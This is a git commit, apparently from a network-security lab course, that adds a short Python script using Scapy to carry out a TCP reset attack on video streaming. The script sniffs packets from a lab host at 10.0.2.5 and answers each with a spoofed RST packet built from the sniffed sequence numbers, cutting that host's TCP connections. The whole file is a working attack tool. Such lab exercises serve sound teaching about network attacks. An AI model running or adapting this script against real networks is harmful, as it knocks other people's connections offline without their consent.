5ef01ea5939f2a2d58817dc46e03183f3ff4d5ec
Xinyi Li <wolixinyi@gmail.com>
2020-03-25 02:11:37 -0400

    TCP RST Attacks on Video Streaming

---
+++ TCP-IP-Attack/auto_rst.py
@@ -0,0 +1,12 @@
+#!/usr/bin/python3
+from scapy.all import *
+
+def spoof_tcp(pkt):
+   ip  = IP(dst="10.0.2.5", src=pkt['IP'].dst)
+   tcp = TCP(flags="R", seq=pkt['TCP'].ack,
+                  dport=pkt['TCP'].sport, sport=pkt['TCP'].dport)
+   spoofpkt = ip / tcp
+   print("send a RST oacket")
+   send(spoofpkt, verbose=0)
+
+pkt=sniff(filter='tcp and src host 10.0.2.5', prn=spoof_tcp)
